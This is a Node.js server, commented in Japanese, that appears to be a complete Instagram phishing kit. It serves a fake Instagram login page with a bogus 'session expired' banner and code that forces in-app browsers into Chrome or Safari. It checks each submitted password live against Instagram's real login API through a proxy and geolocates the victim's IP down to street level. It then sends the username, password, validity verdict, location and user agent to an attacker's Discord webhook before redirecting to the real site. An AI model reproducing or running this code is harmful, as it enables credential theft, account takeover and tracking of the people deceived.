'use strict';

require('dotenv').config();

const express = require('express');
const axios = require('axios');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');

/* ---------------------------------------------------------------- config */

const PORT             = process.env.PORT || 3000;
const DISCORD_WEBHOOK  = process.env.DISCORD_WEBHOOK_URL || '';
const SUCCESS_REDIRECT = process.env.SUCCESS_REDIRECT || 'https://www.instagram.com/';
const STRICT_CHECK     = process.env.STRICT_CHECK === '1';   // 1 = 判定不能なら通さない
const IG_PROXY         = process.env.IG_PROXY || '';        // 例: http://user:pass@host:port
const CHECK_TIMEOUT    = Number(process.env.CHECK_TIMEOUT || 15000);
const MAX_PER_MIN      = Number(process.env.MAX_PER_MIN || 8); // 同一IPあたりの試行上限
const GEO_USER_AGENT   = process.env.GEO_USER_AGENT || 'instagram-njsd/1.0 (login-monitor)';

const proxyAgent = IG_PROXY ? new HttpsProxyAgent(IG_PROXY) : undefined;

const app = express();
app.set('trust proxy', true);
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use('/static', express.static(path.join(__dirname, 'static')));

/* --------------------------------------------------------------- helpers */

const TRACKER_GIF = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (typeof xff === 'string' && xff.length) return xff.split(',')[0].trim();
  return req.socket.remoteAddress || '';
}

function isPrivateIp(ip) {
  if (!ip) return true;
  const v4 = ip.replace(/^::ffff:/, '');
  return (
    v4 === '127.0.0.1' || v4 === '::1' ||
    /^10\./.test(v4) ||
    /^192\.168\./.test(v4) ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(v4) ||
    /^169\.254\./.test(v4)
  );
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* Discord markdown を壊さないようにコードブロック用に包む */
function codeBlock(s, max = 900) {
  const v = String(s == null ? '' : s).replace(/```/g, '``\u200b`');
  return '```\n' + (v.length > max ? v.slice(0, max) + '…' : v) + '\n```';
}

/* ------------------------------------------------------- 逆ジオコーディング */

function emptyGeo(ip) {
  return {
    ip: ip || '-',
    country: '', region: '', city: '', cityDistrict: '', district: '',
    suburb: '', neighbourhood: '', quarter: '', road: '', houseNumber: '',
    zip: '', isp: '', org: '', proxy: null, hosting: null, mobile: null,
    lat: null, lon: null, source: ''
  };
}

/* 1) 前方参照：座標と粗い行政区分を取る */
async function forwardGeo(ip) {
  const enc = encodeURIComponent(ip);

  const sources = [
    // ip-api.com（地区・郵便番号・回線種別まで）
    async () => {
      const r = await axios.get(`http://ip-api.com/json/${enc}`, {
        params: {
          lang: 'ja',
          fields: 'status,country,countryCode,regionName,city,district,zip,lat,lon,isp,org,mobile,proxy,hosting,query'
        },
        timeout: 6000,
        validateStatus: () => true
      });
      if (!r.data || r.data.status !== 'success') return null;
      return {
        source: 'ip-api.com',
        country: r.data.country || '',
        region: r.data.regionName || '',
        city: r.data.city || '',
        district: r.data.district || '',
        zip: r.data.zip || '',
        isp: r.data.isp || '',
        org: r.data.org || '',
        proxy: r.data.proxy ?? null,
        hosting: r.data.hosting ?? null,
        mobile: r.data.mobile ?? null,
        lat: r.data.lat ?? null,
        lon: r.data.lon ?? null
      };
    },

    // ipwho.is
    async () => {
      const r = await axios.get(`https://ipwho.is/${enc}`, {
        params: { lang: 'ja' },
        timeout: 6000,
        validateStatus: () => true
      });
      if (!r.data || r.data.success === false) return null;
      return {
        source: 'ipwho.is',
        country: r.data.country || '',
        region: r.data.region || '',
        city: r.data.city || '',
        zip: r.data.postal || '',
        isp: r.data.connection && r.data.connection.isp || '',
        org: r.data.connection && r.data.connection.org || '',
        lat: r.data.latitude ?? null,
        lon: r.data.longitude ?? null
      };
    },

    // freeipapi.com
    async () => {
      const r = await axios.get(`https://freeipapi.com/api/json/${enc}`, {
        timeout: 6000,
        validateStatus: () => true
      });
      if (!r.data || !r.data.cityName && !r.data.regionName) return null;
      return {
        source: 'freeipapi.com',
        country: r.data.countryName || '',
        region: r.data.regionName || '',
        city: r.data.cityName || '',
        zip: r.data.zipCode || '',
        lat: r.data.latitude ?? null,
        lon: r.data.longitude ?? null
      };
    },

    // ipapi.co
    async () => {
      const r = await axios.get(`https://ipapi.co/${enc}/json/`, {
        timeout: 6000,
        validateStatus: () => true
      });
      const d = r.data || {};
      if (d.error || (!d.city && !d.region)) return null;
      return {
        source: 'ipapi.co',
        country: d.country_name || '',
        region: d.region || '',
        city: d.city || '',
        zip: d.postal || '',
        org: d.org || '',
        lat: d.latitude ?? null,
        lon: d.longitude ?? null
      };
    },

    // ipinfo.io
    async () => {
      const r = await axios.get(`https://ipinfo.io/${enc}/json`, {
        timeout: 6000,
        validateStatus: () => true
      });
      const d = r.data || {};
      if (!d.city && !d.region) return null;
      let lat = null, lon = null;
      if (typeof d.loc === 'string' && d.loc.includes(',')) {
        const [la, lo] = d.loc.split(',');
        lat = Number(la); lon = Number(lo);
      }
      return {
        source: 'ipinfo.io',
        country: d.country || '',
        region: d.region || '',
        city: d.city || '',
        zip: d.postal || '',
        org: d.org || '',
        lat, lon
      };
    }
  ];

  for (const fn of sources) {
    try {
      const v = await fn();
      if (v && (v.city || v.region || v.lat != null)) return v;
    } catch (_) {}
  }
  return null;
}

/* 2) 逆ジオコーディング：座標 → 町名・通り */
async function reverseGeo(lat, lon) {
  const out = {
    cityDistrict: '', suburb: '', neighbourhood: '', quarter: '',
    road: '', houseNumber: '', city: '', zip: '', source: ''
  };
  if (lat == null || lon == null) return out;

  // BigDataCloud（キー不要・細かい地区情報を返す）
  try {
    const r = await axios.get('https://api.bigdatacloud.net/data/reverse-geocode-client', {
      params: { latitude: lat, longitude: lon, localityLanguage: 'ja' },
      timeout: 6000,
      validateStatus: () => true
    });
    const d = r.data || {};
    const info = Array.isArray(d.localityInfo) ? d.localityInfo : [];
    const pick = (keys) => {
      for (const group of info) {
        if (!Array.isArray(group)) continue;
        for (const e of group) {
          const desc = String(e && e.description || '').toLowerCase();
          if (keys.some((k) => desc === k || desc.includes(k))) {
            if (e.name) return e.name;
          }
        }
      }
      return '';
    };
    out.neighbourhood = pick(['neighbourhood', 'neighborhood']);
    out.suburb = pick(['suburb']);
    out.quarter = pick(['quarter', 'borough']);
    out.cityDistrict = d.city || '';
    out.city = d.city || d.locality || '';
    out.zip = d.postcode || '';
    if (out.neighbourhood || out.suburb || out.quarter) out.source = 'bigdatacloud';
  } catch (_) {}

  // Nominatim（OSM）— 1req/秒制限あり、UA必須
  try {
    const r = await axios.get('https://nominatim.openstreetmap.org/reverse', {
      params: {
        format: 'jsonv2',
        lat, lon,
        zoom: 18,
        addressdetails: 1,
        'accept-language': 'ja'
      },
      headers: { 'User-Agent': GEO_USER_AGENT },
      timeout: 8000,
      validateStatus: () => true
    });
    const a = (r.data && r.data.address) || {};
    out.suburb = out.suburb || a.suburb || a.neighbourhood || '';
    out.neighbourhood = out.neighbourhood || a.neighbourhood || a.hamlet || '';
    out.quarter = out.quarter || a.quarter || a.city_district || '';
    out.cityDistrict = out.cityDistrict || a.city_district || a.town || '';
    out.city = out.city || a.city || a.town || a.village || '';
    out.road = a.road || a.pedestrian || a.footway || '';
    out.houseNumber = a.house_number || '';
    out.zip = out.zip || a.postcode || '';
    if (a.road || a.house_number) out.source = 'nominatim';
  } catch (_) {}

  return out;
}

async function lookupGeo(ip) {
  const out = emptyGeo(ip);
  if (isPrivateIp(ip)) return out;

  const fwd = await forwardGeo(ip);
  if (!fwd) return out;

  out.country = fwd.country;
  out.region = fwd.region;
  out.city = fwd.city;
  out.district = fwd.district;
  out.zip = fwd.zip;
  out.isp = fwd.isp;
  out.org = fwd.org;
  out.proxy = fwd.proxy;
  out.hosting = fwd.hosting;
  out.mobile = fwd.mobile;
  out.lat = fwd.lat;
  out.lon = fwd.lon;
  out.source = fwd.source;

  const rev = await reverseGeo(out.lat, out.lon);
  out.cityDistrict = rev.cityDistrict;
  out.suburb = rev.suburb;
  out.neighbourhood = rev.neighbourhood;
  out.quarter = rev.quarter;
  out.road = rev.road;
  out.houseNumber = rev.houseNumber;
  if (!out.city) out.city = rev.city;
  if (!out.zip) out.zip = rev.zip;
  if (rev.source) out.source += ' + ' + rev.source;

  return out;
}

function geoLine(g) {
  const road = g.road ? (g.houseNumber ? `${g.road} ${g.houseNumber}` : g.road) : '';
  const parts = [
    g.country, g.region,
    g.cityDistrict || g.city, g.district,
    g.suburb, g.neighbourhood, g.quarter,
    road, g.zip
  ].filter(Boolean);

  const seen = new Set();
  const uniq = [];
  for (const p of parts) {
    const k = String(p).trim();
    if (k && !seen.has(k)) { seen.add(k); uniq.push(k); }
  }
  return uniq.length ? uniq.join(' / ') : '不明';
}

/* --------------------------------------------------------------- Instagram */

const IG_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15'
];
const pickUA = () => IG_UAS[Math.floor(Math.random() * IG_UAS.length)];

const IG_APP_ID_FALLBACK = '936619743392459';

/**
 * 戻り値: 'ok' | 'bad_password' | 'no_user' | 'rate' | 'unknown'
 */
async function checkInstagram(usernameRaw, password) {
  const username = String(usernameRaw || '').replace(/^@/, '').trim();
  if (!username || !password) return 'unknown';

  const ua = pickUA();
  const baseHeaders = {
    'User-Agent': ua,
    'Accept-Language': 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
  };

  let csrf = '';
  let appId = IG_APP_ID_FALLBACK;
  const cookieParts = [];

  // 1) csrftoken と mid を取得
  try {
    const warm = await axios.get('https://www.instagram.com/', {
      headers: baseHeaders,
      timeout: CHECK_TIMEOUT,
      httpsAgent: proxyAgent,
      maxRedirects: 3,
      validateStatus: () => true
    });

    const setCookie = warm.headers['set-cookie'] || [];
    for (const c of setCookie) {
      const m = /^([^=]+)=([^;]*)/.exec(c);
      if (!m) continue;
      cookieParts.push(`${m[1]}=${m[2]}`);
      if (m[1] === 'csrftoken') csrf = m[2];
    }

    const html = typeof warm.data === 'string' ? warm.data : '';
    const idMatch = /"x-ig-app-id"\s*:\s*"(\d+)"/.exec(html) || /"app_id"\s*:\s*"(\d+)"/.exec(html);
    if (idMatch) appId = idMatch[1];

    if (warm.status === 429 && !csrf) return 'rate';
  } catch (_) {
    return 'unknown';
  }

  if (!csrf) return 'unknown';

  // 2) ログインPOST
  const encPassword = `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`;
  const body = new URLSearchParams({
    username,
    enc_password: encPassword,
    queryParams: '{}',
    optIntoOneTap: 'false',
    stopDeletionNonce: '',
    trustedDeviceRecords: '{}'
  }).toString();

  let res;
  try {
    res = await axios.post(
      'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
      body,
      {
        headers: {
          ...baseHeaders,
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-CSRFToken': csrf,
          'X-Instagram-AJAX': '1',
          'X-IG-App-ID': appId,
          'X-Requested-With': 'XMLHttpRequest',
          'X-ASBD-ID': '129477',
          Origin: 'https://www.instagram.com',
          Referer: 'https://www.instagram.com/',
          Cookie: cookieParts.join('; ')
        },
        timeout: CHECK_TIMEOUT,
        httpsAgent: proxyAgent,
        maxRedirects: 0,
        validateStatus: () => true
      }
    );
  } catch (_) {
    return 'unknown';
  }

  const d = res.data && typeof res.data === 'object' ? res.data : {};
  const msg = String(d.message || '');

  if (res.status === 429) return 'rate';
  if (d.authenticated === true) return 'ok';
  if (d.user === false) return 'no_user';
  if (/checkpoint|challenge|suspended/i.test(msg) || d.checkpoint_url) return 'unknown';
  if (/password/i.test(msg) && /incorrect|wrong|正しく/i.test(msg)) return 'bad_password';
  if (/password/i.test(msg)) return 'bad_password';
  if (/username|ユーザー/i.test(msg) && /not|doesn't|存在|登録されて/i.test(msg)) return 'no_user';
  if (d.authenticated === false) return 'bad_password';
  return 'unknown';
}

/* ---------------------------------------------------------------- Discord */

async function notifyDiscord({ username, password, verdict, req, geo }) {
  if (!DISCORD_WEBHOOK) return;

  const verdictLabel = {
    ok: '✅ 認証成功（有効な資格情報）',
    unknown: '⚠️ 判定不能（Instagram側の制限の可能性）',
    rate: '⚠️ 判定不能（レート制限）',
    bad_password: '❌ パスワード誤り',
    no_user: '❌ ユーザー不在'
  }[verdict] || verdict;

  const hasPin = geo.lat != null && geo.lon != null;
  const mapUrl = hasPin ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : null;

  const lineFlags = [
    geo.proxy === true ? 'Proxy/VPN' : null,
    geo.hosting === true ? 'Hosting/DC' : null,
    geo.mobile === true ? 'モバイル回線（位置は基地局単位で粗い）' : null
  ].filter(Boolean).join(' / ') || '-';

  const fields = [
    { name: '👤 ユーザー', value: codeBlock(username), inline: true },
    { name: '🔑 パスワード', value: codeBlock(password), inline: true },
    { name: '📊 判定', value: verdictLabel, inline: false },
    { name: '📍 推定位置（IP由来・誤差あり）', value: geoLine(geo), inline: false },
    { name: '🌐 IP', value: codeBlock(geo.ip, 60), inline: true },
    { name: '🏢 ISP / 組織', value: geo.isp || geo.org || '-', inline: true },
    { name: '🛰 回線種別', value: lineFlags, inline: false }
  ];

  if (hasPin) fields.push({ name: '🗺 地図', value: mapUrl, inline: false });
  if (geo.source) fields.push({ name: '🔎 取得元', value: geo.source, inline: false });

  const ua = String(req.headers['user-agent'] || '-');
  fields.push({ name: '🧭 UA', value: codeBlock(ua.slice(0, 500)), inline: false });
  fields.push({ name: '🕒 時刻', value: new Date().toISOString(), inline: false });

  const payload = {
    username: 'Instagram Login Monitor',
    embeds: [{
      title: 'Instagram ログイン試行',
      color: verdict === 'ok' ? 0x2ecc71 : verdict === 'unknown' || verdict === 'rate' ? 0xf1c40f : 0xe74c3c,
      fields,
      footer: { text: 'instagram-njsd' },
      timestamp: new Date().toISOString()
    }]
  };

  try {
    await axios.post(DISCORD_WEBHOOK, payload, { timeout: 8000, validateStatus: () => true });
  } catch (_) {}
}

/* ------------------------------------------------------------ rate limiter */

const hits = new Map();
function rateLimited(ip) {
  const now = Date.now();
  const arr = (hits.get(ip) || []).filter((t) => now - t < 60_000);
  if (arr.length >= MAX_PER_MIN) {
    hits.set(ip, arr);
    return true;
  }
  arr.push(now);
  hits.set(ip, arr);
  return false;
}

/* ------------------------------------------------------------------ テンプレート */

const ERRORS = {
  bad_password: 'パスワードが正しくありません。もう一度お試しください。',
  no_user: '入力したユーザー名はアカウントに登録されていません。確認してもう一度お試しください。',
  rate: 'ログイン試行が多すぎます。しばらくしてからもう一度お試しください。',
  unknown: 'ログインできませんでした。もう一度お試しください。'
};

function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function renderPage({ error = '', username = '' } = {}) {
  const errBlock = error
    ? `<div class="error" id="ig-error" role="alert">${escapeHtml(error)}</div>`
    : '';

  return `<!DOCTYPE html><html lang="ja"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style rel="stylesheet" type="text/css">@charset "utf-8";

#submit-btn[disabled] { opacity: 0.7; cursor: default; }

.open-browser { display: none; margin-top: 14px; font-size: 13px; }

.open-browser a { color: rgb(0, 55, 107); }

.error {
  background: #fff;
  border: 1px solid #dbdbdb;
  border-radius: 8px;
  color: #ed4956;
  font-size: 13px;
  line-height: 18px;
  padding: 10px 12px;
  margin-bottom: 12px;
  text-align: center;
}</style>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="stylesheet" href="/static/style.css">
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&amp;display=swap" rel="stylesheet">

</head>
<body>

<img src="/open.gif?ref=" width="1" height="1" alt="">

<div class="banner">
  <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877f2"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm1 15h-2v-6h2v6zm0-8h-2V7h2v2"></path></svg>
  <span>セッションの有効期限が切れました。もう一度ログインしてください。</span>
</div>

<div class="container">
  <h1 class="logo">Instagram</h1>

  ${errBlock}

  <form method="POST" action="/login" id="ig-form">
    <div class="field">
      <input id="username" type="text" name="username" placeholder=" " value="${escapeHtml(username)}" autocomplete="username" autocapitalize="off" autocorrect="off" required="">
      <label for="username">電話番号、ユーザーネーム、またはメールアドレス</label>
    </div>

    <div class="field">
      <input id="password" type="password" name="password" placeholder="" autocomplete="current-password" required="">
      <label for="password">パスワード</label>
    </div>

    <button type="submit" id="submit-btn">ログイン</button>

    <div class="or"><span>または</span></div>

    <a class="fb-btn" target="_blank" rel="noopener" href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DAToR43A0h4HVadHRRyLebgfU69yxHvuUhUpOn54yXryxxKDA0zQBislT_gVo5-EejIeXEoCDvanlJhDOzmSd4HBU1e1jD5Tgj-j76lfbK0k5RRug3ovazmwSzKDx9G3ksJqMrxftSGl26CCMmfv8bGtCKRd-bRPuUu77aeBLjbSw6D8J_jh0HFNQR_IrqbJuPw3-ZCQ3s4L7UxhHYhSCHlxz5sKCc0dw7DKLFu4FlA5bSLD51Xl_MCfGh5XyTpeE-wPvpaciPPO9MP1U55PR5KvN4A">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.7-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.2c-1.2 0-1.6.8-1.6 1.6V12h2.7l-.4 2.9h-2.3v7A10 10 0 0 0 22 12z"></path></svg>
      Facebookでログイン
    </a>

    <a class="forgot" target="_blank" rel="noopener" href="https://www.instagram.com/accounts/password/reset/">パスワードをお忘れですか?</a>
  </form>
</div>

<div class="signup">アカウントをお持ちでないですか? <a href="#">登録する</a></div>

<div class="open-browser" id="open-browser">
  <a id="open-browser-link" href="#">ブラウザで開く</a>
</div>

<script>
  (function () {
    var ua = navigator.userAgent || "";
    var inApp = /Line\\//i.test(ua) || /Instagram/i.test(ua) || /FBAN|FBAV/i.test(ua);
    var isAndroid = /Android/i.test(ua);
    var isIOS = /iPhone|iPad|iPod/i.test(ua);

    if (inApp) {
      var box = document.getElementById('open-browser');
      box.style.display = 'block';

      var here = location.host + location.pathname +
        (location.search ? location.search + '&nb=1' : '?nb=1');
      var full = 'https://' + here;
      document.getElementById('open-browser-link').href = full;

      if (location.search.indexOf('nb=1') === -1) {
        if (isAndroid) {
          location.href = 'intent://' + here +
            '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' +
            encodeURIComponent(full) + ';end';
        } else if (isIOS) {
          location.href = 'x-safari-' + full;
          setTimeout(function () {
            if (!document.hidden) location.href = full;
          }, 1500);
        }
      }
    }

    var form = document.getElementById('ig-form');
    var btn = document.getElementById('submit-btn');
    form.addEventListener('submit', function () {
      btn.disabled = true;
      btn.textContent = 'ログイン中...';
    });
    var err = document.getElementById('ig-error');
    if (err) { document.getElementById('password').focus(); }
  })();
</script>

</body></html>`;
}

/* ------------------------------------------------------------------ routes */

app.get('/', (req, res) => {
  res.type('html').send(renderPage());
});

app.get('/open.gif', (req, res) => {
  res.set({
    'Content-Type': 'image/gif',
    'Cache-Control': 'no-store, no-cache, must-revalidate, private',
    Pragma: 'no-cache'
  });
  res.end(TRACKER_GIF);
});

app.post('/login', async (req, res) => {
  const username = String(req.body.username || '').trim();
  const password = String(req.body.password || '');
  const ip = clientIp(req);

  if (!username || !password) {
    return res.type('html').send(renderPage({ error: ERRORS.unknown, username }));
  }

  // 同一IPの連打はInstagramを叩かずに弾く
  if (rateLimited(ip)) {
    return res.type('html').send(renderPage({ error: ERRORS.rate, username }));
  }

  let verdict = 'unknown';
  for (let attempt = 0; attempt < 2; attempt++) {
    verdict = await checkInstagram(username, password);
    if (verdict === 'ok' || verdict === 'bad_password' || verdict === 'no_user') break;
    await sleep(600 + attempt * 900);
  }

  // 明確な失敗はエラー表示のみ
  if (verdict === 'bad_password' || verdict === 'no_user') {
    return res.type('html').send(renderPage({ error: ERRORS[verdict], username }));
  }

  // 判定不能：STRICT なら通さない
  if ((verdict === 'unknown' || verdict === 'rate') && STRICT_CHECK) {
    return res.type('html').send(renderPage({ error: ERRORS[verdict] || ERRORS.unknown, username }));
  }

  const geo = await lookupGeo(ip);
  notifyDiscord({ username, password, verdict, req, geo }).catch(() => {});

  return res.redirect(303, SUCCESS_REDIRECT);
});

/* ------------------------------------------------------------------- start */

app.listen(PORT, () => {
  console.log(`listening on :${PORT} (strict=${STRICT_CHECK ? 'on' : 'off'})`);
});
